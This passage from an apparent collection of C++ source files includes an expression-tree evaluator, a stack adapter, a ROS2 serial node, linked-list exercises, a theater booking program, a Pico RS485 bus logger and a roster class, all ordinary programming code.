{}//\u0434\u0435\u0441\u0442\u0440\u0443\u043a\u0442\u043e\u0440, \u0442\u043e\u0436\u0435 \u0432\u0438\u0440\u0442\u0443\u0430\u043b\u044c\u043d\u044b\u0439\n\tstd::string print() const { return std::to_string(this->value_); }\n\tExpression* transform(Transformer* tr) const\n\t{\n\t\treturn tr->transformNumber(this);\n\t}\nprivate:\n\tdouble value_; // \u0441\u0430\u043c\u043e \u0432\u0435\u0449\u0435\u0441\u0442\u0432\u0435\u043d\u043d\u043e\u0435 \u0447\u0438\u0441\u043b\u043e\n};\n\n\nstruct BinaryOperation : Expression // \u00ab\u0411\u0438\u043d\u0430\u0440\u043d\u0430\u044f \u043e\u043f\u0435\u0440\u0430\u0446\u0438\u044f\u00bb\n{\n\tenum { // \u043f\u0435\u0440\u0435\u0447\u0438\u0441\u043b\u0438\u043c \u043a\u043e\u043d\u0441\u0442\u0430\u043d\u0442\u044b, \u043a\u043e\u0442\u043e\u0440\u044b\u043c\u0438 \u0437\u0430\u0448\u0438\u0444\u0440\u0443\u0435\u043c \u0441\u0438\u043c\u0432\u043e\u043b\u044b \u043e\u043f\u0435\u0440\u0430\u0446\u0438\u0439\n\t\tPLUS = '+',\n\t\tMINUS = '-',\n\t\tDIV = '/',\n\t\tMUL = '*'\n\t};\n\t// \u0432 \u043a\u043e\u043d\u0441\u0442\u0440\u0443\u043a\u0442\u043e\u0440\u0435 \u043d\u0430\u0434\u043e \u0443\u043a\u0430\u0437\u0430\u0442\u044c 2 \u043e\u043f\u0435\u0440\u0430\u043d\u0434\u0430 \u2014 \u043b\u0435\u0432\u044b\u0439 \u0438 \u043f\u0440\u0430\u0432\u044b\u0439, \u0430 \u0442\u0430\u043a\u0436\u0435 \u0441\u0430\u043c \u0441\u0438\u043c\u0432\u043e\u043b \u043e\u043f\u0435\u0440\u0430\u0446\u0438\u0438\n\tBinaryOperation(Expression const* left, int op, Expression const* right) : left_(left), op_(op), right_(right)\n\t{\n\t\tassert(left_ && right_);\n\t}\n\t~BinaryOperation() //\u0432 \u0434\u0435\u0441\u0442\u0440\u0443\u043a\u0442\u043e\u0440\u0435 \u043e\u0441\u0432\u043e\u0431\u043e\u0434\u0438\u043c \u0437\u0430\u043d\u044f\u0442\u0443\u044e \u043f\u0430\u043c\u044f\u0442\u044c\n\t{\n\t\tdelete left_;\n\t\tdelete right_;\n\t}\n\tExpression const* left() const { return left_; } // \u0447\u0442\u0435\u043d\u0438\u0435 \u043b\u0435\u0432\u043e\u0433\u043e \u043e\u043f\u0435\u0440\u0430\u043d\u0434\u0430\n\tExpression const* right() const { return right_; } // \u0447\u0442\u0435\u043d\u0438\u0435 \u043f\u0440\u0430\u0432\u043e\u0433\u043e \u043e\u043f\u0435\u0440\u0430\u043d\u0434\u0430\n\tint operation() const { return op_; } // \u0447\u0442\u0435\u043d\u0438\u0435 \u0441\u0438\u043c\u0432\u043e\u043b\u0430 \u043e\u043f\u0435\u0440\u0430\u0446\u0438\u0438\n\tdouble evaluate() const // \u0440\u0435\u0430\u043b\u0438\u0437\u0430\u0446\u0438\u044f \u0432\u0438\u0440\u0442\u0443\u0430\u043b\u044c\u043d\u043e\u0433\u043e \u043c\u0435\u0442\u043e\u0434\u0430 \u00ab\u0432\u044b\u0447\u0438\u0441\u043b\u0438\u0442\u044c\u00bb\n\t{\n\t\tdouble left = left_->evaluate(); // \u0432\u044b\u0447\u0438\u0441\u043b\u044f\u0435\u043c \u043b\u0435\u0432\u0443\u044e \u0447\u0430\u0441\u0442\u044c\n\t\tdouble right = right_->evaluate(); // \u0432\u044b\u0447\u0438\u0441\u043b\u044f\u0435\u043c \u043f\u0440\u0430\u0432\u0443\u044e \u0447\u0430\u0441\u0442\u044c\n\t\tswitch (op_) // \u0432 \u0437\u0430\u0432\u0438\u0441\u0438\u043c\u043e\u0441\u0442\u0438 \u043e\u0442 \u0432\u0438\u0434\u0430 \u043e\u043f\u0435\u0440\u0430\u0446\u0438\u0438, \u0441\u043a\u043b\u0430\u0434\u044b\u0432\u0430\u0435\u043c, \u0432\u044b\u0447\u0438\u0442\u0430\u0435\u043c, \u0443\u043c\u043d\u043e\u0436\u0430\u0435\u043c\n\t\t\t// \u0438\u043b\u0438 \u0434\u0435\u043b\u0438\u043c \u043b\u0435\u0432\u0443\u044e \u0438 \u043f\u0440\u0430\u0432\u0443\u044e \u0447\u0430\u0441\u0442\u0438\n\t\t{\n\t\tcase PLUS: return left + right;\n\t\tcase MINUS: return left - right;\n\t\tcase DIV: return left / right;\n\t\tcase MUL: return left * right;\n\t\t}\n\t}\n\tExpression* transform(Transformer* tr) const\n\t{\n\t\treturn tr->transformBinaryOperation(this);\n\t}\n\tstd::string print() const {\n\t\treturn this->left_->print() + std::string(1, this->op_) + this->right_->print();\n\t}\nprivate:\n\tExpression const* left_; // \u0443\u043a\u0430\u0437\u0430\u0442\u0435\u043b\u044c \u043d\u0430 \u043b\u0435\u0432\u044b\u0439 \u043e\u043f\u0435\u0440\u0430\u043d\u0434\n\tExpression const* right_; // \u0443\u043a\u0430\u0437\u0430\u0442\u0435\u043b\u044c \u043d\u0430 \u043f\u0440\u0430\u0432\u044b\u0439 \u043e\u043f\u0435\u0440\u0430\u043d\u0434\n\tint op_; // \u0441\u0438\u043c\u0432\u043e\u043b \u043e\u043f\u0435\u0440\u0430\u0446\u0438\u0438\n};\nstruct FunctionCall : Expression // \u0441\u0442\u0440\u0443\u043a\u0442\u0443\u0440\u0430 \u00ab\u0412\u044b\u0437\u043e\u0432 \u0444\u0443\u043d\u043a\u0446\u0438\u0438\u00bb\n{\n\t// \u0432 \u043a\u043e\u043d\u0441\u0442\u0440\u0443\u043a\u0442\u043e\u0440\u0435 \u043d\u0430\u0434\u043e \u0443\u0447\u0435\u0441\u0442\u044c \u0438\u043c\u044f \u0444\u0443\u043d\u043a\u0446\u0438\u0438 \u0438 \u0435\u0435 \u0430\u0440\u0433\u0443\u043c\u0435\u043d\u0442\n\tFunctionCall(std::string const& name, Expression const* arg) : name_(name),\n\t\targ_(arg)\n\t{\n\t\tassert(arg_);\n\t\tassert(name_ == \"sqrt\" || name_ == \"abs\");\n\t} // \u0440\u0430\u0437\u0440\u0435\u0448\u0435\u043d\u044b \u0442\u043e\u043b\u044c\u043a\u043e \u0432\u044b\u0437\u043e\u0432 sqrt \u0438 abs\n\tstd::string const& name() const\n\t{\n\t\treturn name_;\n\t}\n\tExpression const* arg() const // \u0447\u0442\u0435\u043d\u0438\u0435 \u0430\u0440\u0433\u0443\u043c\u0435\u043d\u0442\u0430 \u0444\u0443\u043d\u043a\u0446\u0438\u0438\n\t{\n\t\treturn arg_;\n\t}\n\t~FunctionCall() { delete arg_; } // \u043e\u0441\u0432\u043e\u0431\u043e\u0436\u0434\u0430\u0435\u043c \u043f\u0430\u043c\u044f\u0442\u044c \u0432 \u0434\u0435\u0441\u0442\u0440\u0443\u043a\u0442\u043e\u0440\u0435\n\tvirtual double evaluate() const { // \u0440\u0435\u0430\u043b\u0438\u0437\u0430\u0446\u0438\u044f \u0432\u0438\u0440\u0442\u0443\u0430\u043b\u044c\u043d\u043e\u0433\u043e \u043c\u0435\u0442\u043e\u0434\u0430\n\t\t//\u00ab\u0432\u044b\u0447\u0438\u0441\u043b\u0438\u0442\u044c\u00bb\n\t\tif (name_ == \"sqrt\")\n\t\t\treturn sqrt(arg_->evaluate()); // \u043b\u0438\u0431\u043e \u0432\u044b\u0447\u0438\u0441\u043b\u044f\u0435\u043c \u043a\u043e\u0440\u0435\u043d\u044c \u043a\u0432\u0430\u0434\u0440\u0430\u0442\u043d\u044b\u0439\n\t\telse return fabs(arg_->evaluate());\n\t} // \u043b\u0438\u0431\u043e \u043c\u043e\u0434\u0443\u043b\u044c \u2014 \u043e\u0441\u0442\u0430\u043b\u044c\u043d\u044b\u0435 \u0444\u0443\u043d\u043a\u0446\u0438\u0438\n//\u0437\u0430\u043f\u0440\u0435\u0449\u0435\u043d\u044b\n\tstd::string print() const {\n\t\treturn this->name_ + \"(\" + this->arg_->print() + \")\";\n\t}\n\tExpression* transform(Transformer* tr) const\n\t{\n\t\treturn tr->transformFunctionCall(this);\n\t}\nprivate:\n\tstd::string const name_; // \u0438\u043c\u044f \u0444\u0443\u043d\u043a\u0446\u0438\u0438\n\tExpression const* arg_; // \u0443\u043a\u0430\u0437\u0430\u0442\u0435\u043b\u044c \u043d\u0430 \u0435\u0435 \u0430\u0440\u0433\u0443\u043c\u0435\u043d\u0442\n};\nstruct Variable : Expression // \u0441\u0442\u0440\u0443\u043a\u0442\u0443\u0440\u0430 \u00ab\u041f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u0430\u044f\u00bb\n{\n\tVariable(std::string const& name) : name_(name) { } //\u0432 \u043a\u043e\u043d\u0441\u0442\u0440\u0443\u043a\u0442\u043e\u0440\u0435 \u043d\u0430\u0434\u043e\n\t//\u0443\u043a\u0430\u0437\u0430\u0442\u044c \u0435\u0435 \u0438\u043c\u044f\n\tstd::string const& name() const { return name_; } // \u0447\u0442\u0435\u043d\u0438\u0435 \u0438\u043c\u0435\u043d\u0438 \u043f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u043e\u0439\n\tdouble evaluate() const // \u0440\u0435\u0430\u043b\u0438\u0437\u0430\u0446\u0438\u044f \u0432\u0438\u0440\u0442\u0443\u0430\u043b\u044c\u043d\u043e\u0433\u043e \u043c\u0435\u0442\u043e\u0434\u0430 \u00ab\u0432\u044b\u0447\u0438\u0441\u043b\u0438\u0442\u044c\u00bb\n\t{\n\t\treturn 0.0;\n\t}\n\tstd::string print() const {\n\t\treturn this->name_;\n\t}\n\tExpression* transform(Transformer* tr) const\n\t{\n\t\treturn tr->transformVariable(this);\n\t}\nprivate:\n\tstd::string const name_; // \u0438\u043c\u044f \u043f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u043e\u0439\n};\n\n//\u0420\u0435\u0430\u043b\u0438\u0437\u043e\u0432\u0430\u043d \u043a\u043b\u0430\u0441\u0441 CopySyntaxTree\nstruct CopySyntaxTree : Transformer\n{\n\tExpression* transformNumber(Number const* number)\n\t{\n\t\tExpression* exp = new Number(number->value());\n\t\treturn exp;\n\t}\n\tExpression* transformBinaryOperation(BinaryOperation const* binop)\n\t{\n\t\tExpression* exp = new BinaryOperation((binop->left())->transform(this), binop->operation(), (binop->right())->transform(this));\n\t\treturn exp;\n\t}\n\tExpression* transformFunctionCall(FunctionCall const* fcall)\n\t{\n\t\tExpression* exp = new ",
    "\ufeff#include <iostream>\n#include <string>\nusing namespace std;\n//\u0426\u0435\u043b\u0435\u0432\u043e\u0439 \u043a\u043b\u0430\u0441\u0441 \"\u0421\u0442\u0435\u043a\"\ntemplate <typename T>\nclass Stack {\npublic:\n    Stack() {};\n    virtual void push(T element) = 0;\n    virtual T pop() = 0;\n    virtual bool isEmpty() const = 0;\n    virtual ~Stack() {}\n};\n//\u041a\u043b\u0430\u0441\u0441 \u0443\u0437\u043b\u0430 \u0441\u043f\u0438\u0441\u043a\u0430\ntemplate <typename T>\nclass Node  {\npublic:\n    T data;\n    Node <T>* next;\n    Node(T value) : data(value), next(nullptr) {}\n};\n// \u0410\u0434\u0430\u043f\u0442\u0438\u0440\u0443\u0435\u043c\u044b\u0439 \u043a\u043b\u0430\u0441\u0441 \"\u0421\u0432\u044f\u0437\u043d\u044b\u0439 \u0441\u043f\u0438\u0441\u043e\u043a\"\ntemplate <typename T>\nclass List {\nprivate:\n    Node<T>* head;\npublic:\n    List() : head(nullptr) {}\n    void addToEnd(T element) {\n        Node<T>* newNode = new Node<T>(element);\n        if (head == nullptr) {\n            head = newNode;\n        }\n        else {\n            Node<T >* current = head;\n            while (current->next != nullptr) {\n                current = current->next;\n            }\n            current->next = newNode;\n        }\n    }\n    T removeFromEnd() {\n        if (head != nullptr) {\n            if (head->next == nullptr) {\n                T tmp = head->data;\n                delete head;\n                head = nullptr;\n                return tmp;\n            }\n            else {\n                Node<T>* current = head;\n                while (current->next->next != nullptr) {\n                    current = current->next;\n                }\n                T tmp = current->next->data;\n                delete current->next;\n                current->next = nullptr;\n                return tmp;\n            }\n        }\n    }\n    bool isEmpty() const {\n        return head == nullptr;\n    }\n    ~List() {\n        Node<T>* current = head;\n        while (current != nullptr) {\n            Node<T>* temp = current;\n            current = current->next;\n            delete temp;\n        }\n    }\n};\n// \u0410\u0434\u0430\u043f\u0442\u0435\u0440 \u043a\u043b\u0430\u0441\u0441\u0430\ntemplate <typename T> \nclass StackAdapter : public Stack<T> ,private List<T>{\npublic:\n    void push(T element) override \n    {\n        List<T>::addToEnd(element);\n    }\n    T pop() override \n    {\n        return List<T>::removeFromEnd();\n    }\n    bool isEmpty() const override \n    {\n        return List<T>::isEmpty();\n    }\n};\nint main() {\n    Stack<int>* stackint = new StackAdapter<int>();\n    stackint->push(1);\n    stackint->push(2);\n    stackint->push(3);\n    stackint->push(4);\n    while (!stackint->isEmpty()) {\n        cout << stackint->pop() << endl;\n    }\n    Stack<string>* stackstring = new StackAdapter<string>();\n    stackstring->push(\"A\");\n    stackstring->push(\"B\");\n    stackstring->push(\"C\");\n    stackstring->push(\"D\");\n    while (!stackstring->isEmpty()) {\n        cout << stackstring->pop() << endl;\n    }\n\n    \n}\n\n\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"serial_connector_ros2.hpp\"\n\nnamespace serial_connector_ros2\n{\n    SerialConnectorROS2::SerialConnectorROS2(const rclcpp::NodeOptions& options):rclcpp::Node(\"serial_connector_ros2\", options)\n    {\n        subscriber_ = this->create_subscription<std_msgs::msg::String>(\n            \"/write\",\n            0,\n            std::bind(&SerialConnectorROS2::topic_callback, this, _1));\n\n        this->declare_parameter(\"port_name\", \"/dev/ttyACM0\");\n        this->get_parameter(\"port_name\", port_name_);\n\n        this->declare_parameter(\"baud_rate\", 115200);\n        this->get_parameter(\"baud_rate\", baud_rate_);\n\n        handler_ = std::shared_ptr<serial_connector_ros2::SerialHandler>(serial_connector_ros2::SerialHandler::init_handler(port_name_, baud_rate_));\n\n        int open_err = handler_->open_port();\n        if(open_err < 0)\n        {\n            RCLCPP_ERROR(this->get_logger(), \"Failed to open Port\");\n            handler_->close_port();\n        }\n\n        RCLCPP_INFO(this->get_logger(), \"Start SerialConnectorROS2 port:%s, baud_rate:%d\", handler_->get_port_name().c_str(), handler_->get_baud_rate());\n    }\n\n    void SerialConnectorROS2::topic_callback(const std_msgs::msg::String::SharedPtr msg)\n    {\n        std::string tx_packet;\n        tx_packet = msg->data;\n\n        int write_err = handler_->write_serial(tx_packet);\n\n        if(write_err < 0)\n        {\n            RCLCPP_ERROR(this->get_logger(), \"Failed to write\");\n        }\n        else\n        {\n            RCLCPP_INFO(this->get_logger(), \"Write %s\", tx_packet.c_str());\n        }\n    }\n}\n\n#include <rclcpp_components/register_node_macro.hpp>\nRCLCPP_COMPONENTS_REGISTER_NODE(serial_connector_ros2::SerialConnectorROS2)",
    "#include <iostream>\n#include <string>\nusing namespace std;\n\nstruct Node\n{\n    int noMhs;\n    string name;\n    Node* next;\n    Node* prev;\n};\n\nNode* START = NULL;\n\nvoid addNode() {\n    Node* newNode = new Node(); // STEP 1: create a new node\n    cout << \"\\nEnter the roll number of student: \";\n    cin >> newNode->noMhs;      // assign value to the data field of the new node\n    cout << \"\\nEnter the name of the student: \";\n    cin >> newNode->name;       // Assign value to the data field of the new node\n\n    // Insert the new node in the list\n    if (START == NULL || newNode->noMhs <= START->noMhs) { // STEP 2: insert the new node\n        \n        if (START != NULL && newNode->noMhs == START->noMhs) {\n            cout << \"\\033[31mDuplicate roll not allowed\\033[0m\" << endl;\n            return;\n        }\n        // If the list is empty, make the new node the START\n        newNode->next = START;  //STEP 3: make the new node point to the first node\n        if (START != NULL) {    \n            START->prev = newNode;  //STEP 4: make the first node point to the new node\n        }\n        newNode->prev = NULL;       //STEP 5: make the new node point to NULL\n        START = newNode;            //STEP 6: make the new node the first node\n    }\n    else {\n        // insert the new node in the middle or at the end\n        Node* current = START; // STEP 1.a: start from the first\n        Node* previous = NULL; // STEP 1.b: previous node is NULL initially\n\n        while (current != NULL && current->noMhs < newNode->noMhs) { // STEP 1.c: traver\n            previous = current; // STEP 1.d: move the previous to the current Node\n            current = current->next; // STEP 1.e: move the current to the next node\n        }\n\n        newNode->next = current; // STEP 4: Make the next field of the new node point to current\n        newNode->prev = previous; // STEP 5: Make the previous field of the new node point to previous\n        \n        if (current != NULL) {\n            current->prev = newNode; // STEP 6: Make the previous field of the current\n        }\n\n        if (previous != NULL) {\n            previous->next = newNode; // STEP 7 : make the next field of the previous node\n        }\n        else {\n            //If previous is still NULL, it means newNode is now the first node\n            START = newNode;\n        }\n    }\n}\n\nbool search(int rollNo, Node** previous, Node** current)\n{\n    *previous = NULL;\n    *current = START;\n    while (*current != NULL && (*current)->noMhs != rollNo)\n    {\n        *previous = *current;\n        *current = (*current)->next;\n    }\n    return (*current != NULL);\n}\n\nvoid deleteNode()\n{\n    Node* previous, * current;\n    int rollNo;\n\n    cout << \"\\nEnter the roll number of the student whose record is to be deleted: \";\n    cin >> rollNo;                                                                  //STEP 3: get the roll number to be deleted\n\n    if (START == NULL)\n    {\n        cout << \"List is empety\" << endl;\n        return;\n    }\n\n    current = START;                                                               //STEP 1: start from the first node\n    previous = NULL;\n\n    //locate the node to be deleted\n    while (current != NULL && current->noMhs != rollNo)\n    {\n        previous = current;\n        current = current->next;\n    }\n\n    if (current == NULL)\n    {\n        cout << \"\\033[31mThe record with roll number \" << rollNo << \"not found\\033[0m\" << endl;\n        return;\n    }\n\n    //Node to be deleted is the firts node\n    if (current == START)\n    {\n        START = START->next;                                            //STEP 2: update the START pointer\n        if (START != NULL)\n        {\n            START->prev = NULL;                                         //step\n        }\n    }\n    else\n    {   //Node to be deleted is not the first node\n        previous->next = current->next;\n        if (current->next != NULL)\n        {   //if there's successor, update is prev pointer\n            current->next->prev = previous;\n        }\n    }\n\n    //release the memory of the node marked as current\n    delete current;\n    cout << \"\\x1b[32mRecord with roll number \" << rollNo << \"deleted\\x1b[0m\" << endl;\n}\n\nbool listEmpty()\n{\n    return (START == NULL);\n}\n\nvoid traverse()\n{\n    if (listEmpty())\n        cout << \"\\nList is empty\" << endl;\n    else\n    {\n        cout << \"\\nRecord is ascending order of roll number are:  \" << endl;\n        Node* currentNode = START;              //STEP 1\n        while (currentNode != NULL)             //STEP 2\n        {\n            cout << currentNode->noMhs << \" \" << currentNode->name << endl;         //STEP 3\n            currentNode = currentNode->next;                                        //STEP 4\n        }\n    }\n}\n\nvoid revtraverse()\n{\n    if (listEmpty())\n        cout << \"\\nList is empty\" << endl;\n    else\n    {\n        cout << \"\\nRecord is descending order of roll number are:  \" << endl;\n        Node* currentNode = START;\n        while (currentNode->next != NULL)\n      ",
    "#include <iostream>\r\nusing namespace std;\r\n\r\nclass Theater \r\n{\r\npublic:\r\n    void showdata() {\r\n        cout<<\"1. Display movies\"<<endl;\r\n        cout<<\"2. Display seat availability\"<<endl;\r\n        cout<<\"3. Book a ticket\"<<endl;\r\n        cout<<\"4. Cancel_ticket\"<<endl;\r\n        cout<<\"5. Exit\"<<endl;\r\n        cout<<endl;\r\n    }\r\n\r\n    void Display_movies() {\r\n        cout<<\"Available movies:\"<<endl;\r\n        cout<<\"0. Avengers (Action) - 150 min\"<<endl;\r\n        cout<<\"1. Jawan (Action thriller) - 120 min\"<<endl;\r\n        cout<<\"2. The Nun (Horror) - 145 min\"<<endl;\r\n        cout<< \"---------------------------\"<<endl;\r\n    }\r\n\r\n    void Display_seat_availability(char seats[7][7]) \r\n\t{\r\n        cout<<\"Seat availability:\"<<endl;\r\n        for(int i=0;i<7;i++) \r\n\t\t{\r\n            for(int j=0;j<7;j++) \r\n\t\t\t{\r\n                if(seats[i][j]=='O') \r\n\t\t\t\t{\r\n                    cout<<'O'<<\" \"; \r\n                } else \r\n\t\t\t\t{\r\n                    cout<<'X'<<\" \"; \r\n                }\r\n            }\r\n            cout<<endl;\r\n        }\r\n        cout<<\"-----------------------------\"<< endl;\r\n    }\r\n};\r\n\r\nclass Booking : public Theater \r\n{\r\npublic:\r\n    char seats[7][7]; \r\n\r\n    Booking() \r\n\t{\r\n        for(int i=0;i<7;i++) \r\n\t\t{\r\n            for(int j=0;j<7;j++) \r\n\t\t\t{\r\n                seats[i][j]='O';\r\n            }\r\n        }\r\n    }\r\n\r\n    void Book_ticket() \r\n\t{\r\n        Display_movies();\r\n\r\n        int movieIndex;\r\n        cout << \"Select movie index: \";\r\n        cin >> movieIndex;\r\n\r\n        if(movieIndex<0||movieIndex>2) \r\n\t\t{\r\n            cout<<\"Invalid movie index.\"<<endl;\r\n        }\r\n\r\n        Display_seat_availability(seats);\r\n\r\n        int row, column;\r\n        cout<<\"Choose row and column to select a seat for booking (1-7): \";\r\n        cin>>row>>column;\r\n\r\n        if(row>=1&&row<=7&&column>=1&&column<=7) \r\n\t\t{\r\n            if(seats[row-1][column-1]=='O') \r\n\t\t\t{\r\n                seats[row-1][column-1]='X';\r\n                cout<<\"Ticket booked successfully for movie index \"<< movieIndex<<\" and seat \"<<row<< \"-\"<< column << endl;\r\n            } \r\n\t\t\telse \r\n\t\t\t{\r\n                cout<<\"Seat is already booked. Please select another seat.\"<<endl;\r\n            }\r\n        \r\n        cout<< \"-------------------\"<< endl;\r\n    \r\n    \t}\r\n\t}\r\n\tvoid Cancel_ticket() \r\n\t{\r\n        Display_seat_availability(seats);\r\n        int row,column;\r\n        cout<<\"Choose row and column to cancel a booked seat(1-7): \";\r\n        cin>>row>>column;\r\n\r\n        if(row>=1&&row<=7&&column>=1&&column<=7) \r\n\t\t{\r\n            if(seats[row-1][column-1]=='X') \r\n\t\t\t{\r\n                seats[row - 1][column - 1]='O';\r\n                cout<<\"Ticket canceled successfully for seat \"<<row<< \"-\"<<column<<endl;\r\n            } \r\n\t\t\telse \r\n\t\t\t{\r\n                cout <<\"Seat is not booked. Please select a valid seat to cancel.\"<<endl;\r\n            }\r\n            cout<<\"-------------------\"<<endl;\r\n        }\r\n    }\r\n};\r\n\r\nvoid intro() \r\n{\r\n    cout<<\"WELCOME TO THEATER MANAGEMENT PROJECT\"<< endl;\r\n    cout<<\"Created by Vaishnavi and Pradnya\"<< endl;\r\n}\r\n\r\nint main() \r\n{\r\n    intro();\r\n    Booking b;\r\n    int choice;\r\n\r\n    while (true) \r\n\t{\r\n        b.showdata();\r\n        cout<<endl;\r\n        cout<<\"Enter your choice: \";\r\n        cin>>choice;\r\n\r\n        switch(choice) \r\n\t\t{\r\n            case 1:\r\n                b.Display_movies();\r\n                break;\r\n            case 2:\r\n                b.Display_seat_availability(b.seats);\r\n                break;\r\n            case 3:\r\n                b.Book_ticket();\r\n                break;\r\n            case 4:\r\n            \tb.Cancel_ticket();\r\n            case 5:\r\n                cout<<\"Exiting the program\"<< endl;\r\n                \r\n            default:\r\n                cout<<\"Invalid choice\"<< endl;\r\n\t\r\n        }\r\n        \r\n    }\r\n    return 1;\r\n}\r\n\r\n\r\n",
    "int maximalRectangle(vector<vector<char>>& matrix) {\r\n        if (matrix.empty() || matrix[0].empty()) return 0;\r\n        int m = matrix.size();\r\n        int n = matrix[0].size();\r\n        vector<vector<int>> heights(m, vector<int>(n, 0));\r\n        int maxArea = 0;\r\n\r\n        for (int i = 0; i < m; ++i) {\r\n            for (int j = 0; j < n; ++j) {\r\n                if (matrix[i][j] == '1') {\r\n                    heights[i][j] = (i == 0 ? 1 : heights[i - 1][j] + 1);\r\n                }\r\n            }\r\n        }\r\n\r\n        for (int i = 0; i < m; ++i) {\r\n            stack<int> stack;\r\n            vector<int> left(n), right(n, n);\r\n\r\n            for (int j = 0; j < n; ++j) {\r\n                while (!stack.empty() && heights[i][stack.top()] >= heights[i][j]) {\r\n                    right[stack.top()] = j;\r\n                    stack.pop();\r\n                }\r\n                left[j] = (stack.empty() ? -1 : stack.top());\r\n                stack.push(j);\r\n            }\r\n\r\n            for (int j = 0; j < n; ++j) {\r\n                maxArea = max(maxArea, heights[i][j] * (right[j] - left[j] - 1));\r\n            }\r\n        }\r\n\r\n        return maxArea;\r\n    }",
    "#include <stdio.h>\n#include \"pico/stdlib.h\"\n#include <hardware/gpio.h>\n#include <hardware/uart.h>\n#include \"crc.h\"\n\n#define RS485_RX_PIN  21\n#define RS485_TX_PIN  20\n\nvolatile bool ledState = true;\n\nint main() {\n    stdio_init_all();\n\n    gpio_init(PICO_DEFAULT_LED_PIN);\n    gpio_set_dir(PICO_DEFAULT_LED_PIN, GPIO_OUT);\n    gpio_put(PICO_DEFAULT_LED_PIN, 1);\n\n    uart_init(uart1, 38400);\n    gpio_set_function(RS485_RX_PIN, GPIO_FUNC_UART);\n    gpio_set_function(RS485_TX_PIN, GPIO_FUNC_UART);\n\n    \n\n    while (true) {\n        // Wait for a null bute\n        uint8_t byte;\n        do { uart_read_blocking(uart1, &byte, 1); }\n        while (byte);\n\n        gpio_put(PICO_DEFAULT_LED_PIN, 0);\n        uint64_t timestamp = time_us_64();\n\n        // Read the destination\n        uint8_t dest;\n        uart_read_blocking(uart1, &dest, 1);\n\n        // Print header\n        uint32_t us = timestamp % 1000000;\n        uint32_t s = timestamp / (uint64_t)1000000;\n        uint32_t m = s / 60;\n        uint32_t h = m / 60;\n        printf(\"%c %02d:%02d:%02d.%06d \", (dest == 0x05)?'>':'<', h%24, m%60, s%60, us);\n        \n        // Read 0x7E\n        uart_read_blocking(uart1, &byte, 1);\n        //printf(\"7E \");\n\n        // Read data until next 0x7E\n        while (true) {\n            uart_read_blocking(uart1, &byte, 1);\n            if (byte == 0x7E) { break; }\n            printf(\"%02X\", byte);\n        }\n        //printf(\"7E \");\n        printf(\"\\n\");\n\n        gpio_put(PICO_DEFAULT_LED_PIN, 1);\n    }\n    return 0;\n}",
    "#include <iostream>\r\n#include <string>\r\n#include <sstream>\r\n#include \"roster.h\"\r\n#include \"student.h\"\r\nusing std::string;\r\n\r\nRoster::Roster(const string students[]) {\r\n\r\n    int arrSize{sizeof(*students) / sizeof(students)}; // Calculates number of elements in students\r\n\r\n    for (size_t i{0}; i < arrSize; i++) {\r\n        string student{students[i]}; // All info for one student\r\n\r\n        // Store student information separated by comma into array of strings\r\n        string student_info[6 + 3]; // 7 attributes, one is an array of 3 elements\r\n        std::stringstream s_student(student);\r\n        int info_i{0};\r\n        while (s_student.good()) {\r\n            string substr;\r\n            getline(s_student, substr, ',');\r\n            student_info[info_i] = substr;\r\n            info_i++;\r\n        }\r\n\r\n        // String values, direct initialization\r\n        string student_id{student_info[0]};\r\n        string student_first{student_info[1]};\r\n        string student_last{student_info[2]};\r\n        string student_email{student_info[3]};\r\n\r\n        // Int values, must convert string to int\r\n        int student_age{std::stoi(student_info[4], nullptr, 0)};\r\n        int student_days[3]{\r\n            std::stoi(student_info[5], nullptr, 0),\r\n            std::stoi(student_info[6], nullptr, 0),\r\n            std::stoi(student_info[7], nullptr, 0)\r\n        };\r\n\r\n        // DegreeProgram value, must assign based on string input\r\n        string chosen_program{student_info[8]};\r\n        DegreeProgram student_program{};\r\n        if (chosen_program == \"SECURITY\")\r\n            student_program = DegreeProgram::SECURITY;\r\n        else if (chosen_program == \"NETWORK\")\r\n            student_program = DegreeProgram::NETWORK;\r\n        else if (chosen_program == \"SOFTWARE\")\r\n            student_program = DegreeProgram::SOFTWARE;\r\n        else\r\n            throw std::invalid_argument(\"Degree Program isn't valid.\");\r\n\r\n        // Create Student object\r\n        *(classRosterArray + i) = new Student {\r\n            student_id,\r\n            student_first,\r\n            student_last,\r\n            student_email,\r\n            student_age,\r\n            student_days,\r\n            student_program\r\n        };\r\n    }\r\n}\r\n\r\nint Roster::maxStudents() { // Returns the max number of students\r\n    return sizeof(classRosterArray) / sizeof(*classRosterArray);\r\n}\r\n\r\nint Roster::studentIndexById(string studentID) {\r\n    int found{-1};\r\n    for (int i{0}; i < firstEmptySpot(); i++) 